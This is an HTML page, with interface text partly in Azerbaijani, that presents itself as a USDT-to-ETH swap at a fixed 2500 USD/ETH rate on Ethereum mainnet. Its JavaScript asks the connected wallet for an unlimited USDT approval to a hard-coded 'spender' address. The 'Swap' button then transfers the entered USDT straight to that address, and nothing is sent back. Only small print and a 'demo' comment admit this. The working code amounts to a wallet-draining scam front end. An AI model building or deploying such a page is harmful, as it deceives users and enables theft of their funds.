<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>USDT → ETH Swap · Fixed 2500 USD/ETH</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
  <style>
    :root { --glass: rgba(255,255,255,0.6); }
    body { min-height: 100vh; background:
      radial-gradient(1200px 600px at 10% 10%, #f7fafc 0, #eef2f7 50%, #e9edf3 100%);
    }
    .card { backdrop-filter: blur(10px); background: var(--glass); }
    .shadow-soft { box-shadow: 0 10px 30px rgba(15, 23, 42, .08); }
    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    input[type=number] { -moz-appearance: textfield; }
  </style>
</head>
<body class="text-slate-800">
  <div class="max-w-3xl mx-auto p-6">
    <!-- Header -->
    <header class="flex items-center justify-between mb-6">
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-2xl bg-white shadow-soft grid place-items-center font-bold">Ξ</div>
        <div>
          <h1 class="text-xl md:text-2xl font-semibold">USDT → ETH Swap</h1>
          <p class="text-sm text-slate-500">Fixed rate: <span id="fixedRate">1 ETH = 2500 USD</span> · Ethereum Mainnet</p>
        </div>
      </div>
      <button id="connectBtn"
              class="px-4 py-2 rounded-2xl bg-black text-white shadow-soft hover:opacity-90 transition">
        Connect Wallet
      </button>
    </header>

    <!-- Status / Network -->
    <div id="statusBar" class="card rounded-2xl p-4 shadow-soft mb-6 text-sm text-slate-700">
      <div><strong>Wallet:</strong> <span id="account">—</span></div>
      <div><strong>Network:</strong> <span id="network">—</span></div>
      <div><strong>Spender:</strong> <code class="text-xs break-all">0x4f4287A3965D87044a401ccF23BaC838a207b4Cc</code></div>
    </div>

    <!-- Balances -->
    <div class="grid md:grid-cols-2 gap-4 mb-6">
      <div class="card rounded-2xl p-5 shadow-soft">
        <div class="text-sm text-slate-500">ETH Balance</div>
        <div class="text-2xl font-semibold"><span id="ethBal">—</span> ETH</div>
      </div>
      <div class="card rounded-2xl p-5 shadow-soft">
        <div class="text-sm text-slate-500">USDT Balance</div>
        <div class="text-2xl font-semibold"><span id="usdtBal">—</span> USDT</div>
      </div>
    </div>

    <!-- Swap Card -->
    <div class="card rounded-2xl p-6 shadow-soft">
      <div class="flex items-center justify-between mb-4">
        <h2 class="text-lg font-semibold">Swap USDT → ETH</h2>
        <div class="text-xs text-slate-500">Rate locked: 2500 USD/ETH</div>
      </div>

      <label class="block text-sm text-slate-600 mb-2">Məbləğ (USDT)</label>
      <div class="flex items-center gap-3 mb-3">
        <input id="amountIn" type="number" min="0" step="0.000001" placeholder="0.0"
               class="w-full rounded-xl border border-slate-200 p-3 outline-none focus:ring-2 focus:ring-slate-300 bg-white"
               />
        <button id="maxBtn" class="px-3 py-2 rounded-xl bg-white border border-slate-200 hover:bg-slate-50">
          Max
        </button>
      </div>

      <div class="text-sm text-slate-600 mb-4">
        <div>Alacağınız təxmini: <strong><span id="amountOut">0</span> ETH</strong></div>
        <div class="text-xs text-slate-500">Hesablanma: ETH = USDT / 2500</div>
      </div>

      <div class="grid md:grid-cols-2 gap-3">
        <button id="approveBtn"
                class="px-4 py-3 rounded-2xl bg-white border border-slate-200 hover:bg-slate-50">
          1) Approve USDT (Unlimited)
        </button>
        <button id="swapBtn"
                class="px-4 py-3 rounded-2xl bg-black text-white disabled:opacity-40">
          2) Swap (USDT → ETH)
        </button>
      </div>

      <p class="text-xs text-slate-500 mt-4 leading-relaxed">
        Bu UI əvvəlcə USDT üçün <em>unlimited approve</em> verir (spender ünvanına). Daha sonra “Swap” düyməsi
        USDT-ni <strong>birbaşa</strong> spender ünvana <code>transfer</code> edir. Real on-chain məntiqiniz varsa,
        “Swap” içində Sizin kontraktın <code>swap</code> funksiyasına çağırışı yerləşdirin.
      </p>

      <div id="log" class="text-xs text-slate-600 mt-3 space-y-1"></div>
    </div>
  </div>

<script>
(async () => {
  // ---------- Constants ----------
  const FIXED_ETH_PRICE = 2500; // USD per ETH
  const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum Mainnet USDT
  const USDT_DECIMALS = 6n;
  const SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
  const ETHEREUM_CHAIN_ID = 1; // Mainnet

  const ERC20_ABI = [
    "function name() view returns (string)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];

  // ---------- State ----------
  let provider, signer, account, usdt;
  const els = {
    connectBtn: document.getElementById("connectBtn"),
    account: document.getElementById("account"),
    network: document.getElementById("network"),
    ethBal: document.getElementById("ethBal"),
    usdtBal: document.getElementById("usdtBal"),
    amountIn: document.getElementById("amountIn"),
    amountOut: document.getElementById("amountOut"),
    approveBtn: document.getElementById("approveBtn"),
    swapBtn: document.getElementById("swapBtn"),
    maxBtn: document.getElementById("maxBtn"),
    log: document.getElementById("log"),
  };

  function log(msg, txHash) {
    const line = document.createElement("div");
    line.innerHTML = txHash
      ? `${msg} · <a class="underline" target="_blank" href="https://etherscan.io/tx/${txHash}">Etherscan</a>`
      : msg;
    els.log.prepend(line);
  }

  function formatEth(weiBigInt) {
    return Number(ethers.formatEther(weiBigInt)).toFixed(6);
  }

  function formatUnits(amount, decimals) {
    return Number(ethers.formatUnits(amount, Number(decimals))).toFixed(6);
  }

  function parseUSDTAmount(val) {
    // to 6 decimals
    const parts = String(val || "0").split(".");
    const whole = parts[0] || "0";
    const frac = (parts[1] || "").padEnd(6, "0").slice(0,6);
    if (!/^\d+$/.test(whole+frac)) return null;
    return BigInt(whole) * 10n**USDT_DECIMALS + BigInt(frac);
  }

  async function ensureMainnet() {
    const net = await provider.getNetwork();
    if (Number(net.chainId) !== ETHEREUM_CHAIN_ID) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }],
        });
        log("Şəbəkə Ethereum Mainnet-ə dəyişdirildi.");
      } catch (e) {
        log("Xəbərdarlıq: Zəhmət olmasa Ethereum Mainnet-ə keçin.");
        throw e;
      }
    }
  }

  async function connect() {
    if (!window.ethereum) {
      alert("Web3 wallet tapılmadı. Zəhmət olmasa MetaMask və ya uyğun bir wallet quraşdırın.");
      return;
    }
    provider = new ethers.BrowserProvider(window.ethereum, "any");
    await provider.send("eth_requestAccounts", []);
    await ensureMainnet();
    signer = await provider.getSigner();
    account = await signer.getAddress();
    usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

    els.account.textContent = account.slice(0,6) + "…" + account.slice(-4);
    const net = await provider.getNetwork();
    els.network.textContent = `${net.name} (#${net.chainId})`;

    await refreshBalances();
    await refreshAllowance();

    // listeners
    window.ethereum.on?.("accountsChanged", () => location.reload());
    window.ethereum.on?.("chainChanged", () => location.reload());
  }

  async function refreshBalances() {
    if (!signer) return;
    const ethBal = await provider.getBalance(account);
    els.ethBal.textContent = formatEth(ethBal);

    const usdtBal = await usdt.balanceOf(account);
    els.usdtBal.textContent = formatUnits(usdtBal, USDT_DECIMALS);
  }

  async function refreshAllowance() {
    if (!signer) return;
    const allowance = await usdt.allowance(account, SPENDER);
    const hasAllowance = allowance > 0n;
    els.swapBtn.disabled = !hasAllowance;
    if (hasAllowance) {
      log("Allowance mövcuddur: Swap açıqdır.");
    } else {
      log("Allowance yoxdur: əvvəlcə Approve edin.");
    }
  }

  async function approveUnlimited() {
    try {
      const tx = await usdt.approve(SPENDER, ethers.MaxUint256);
      log("Approve göndərildi", tx.hash);
      const rec = await tx.wait();
      log("Approve təsdiqləndi", rec.hash);
      await refreshAllowance();
    } catch (e) {
      console.error(e);
      log("Approve Xəta: " + (e?.shortMessage || e?.message || e), null);
    }
  }

  // Demo swap: USDT-ni birbaşa Spender ünvana köçürür.
  // REAL MÜBADİLƏ: Burada öz kontraktınızın swap() funksiyasına çağırış edin.
  async function performSwap() {
    const val = els.amountIn.value;
    const amt = parseUSDTAmount(val);
    if (amt === null || amt <= 0n) {
      alert("Düzgün USDT məbləği daxil edin.");
      return;
    }
    try {
      const tx = await usdt.transfer(SPENDER, amt);
      log(`Swap (transfer USDT → Spender) göndərildi`, tx.hash);
      const rec = await tx.wait();
      log("Swap təsdiqləndi", rec.hash);
      await refreshBalances();
    } catch (e) {
      console.error(e);
      log("Swap Xəta: " + (e?.shortMessage || e?.message || e), null);
    }
  }

  function recalcOut() {
    const v = parseFloat(els.amountIn.value || "0");
    const ethOut = (isNaN(v) ? 0 : v) / FIXED_ETH_PRICE;
    els.amountOut.textContent = ethOut.toFixed(6);
  }

  // ---------- UI Wiring ----------
  els.connectBtn.addEventListener("click", connect);
  els.approveBtn.addEventListener("click", approveUnlimited);
  els.swapBtn.addEventListener("click", performSwap);
  els.amountIn.addEventListener("input", recalcOut);
  els.maxBtn.addEventListener("click", () => {
    const bal = parseFloat(els.usdtBal.textContent || "0");
    els.amountIn.value = isNaN(bal) ? "" : bal.toFixed(6);
    recalcOut();
  });

  // Initial calc
  recalcOut();
})();
</script>
</body>
</html>
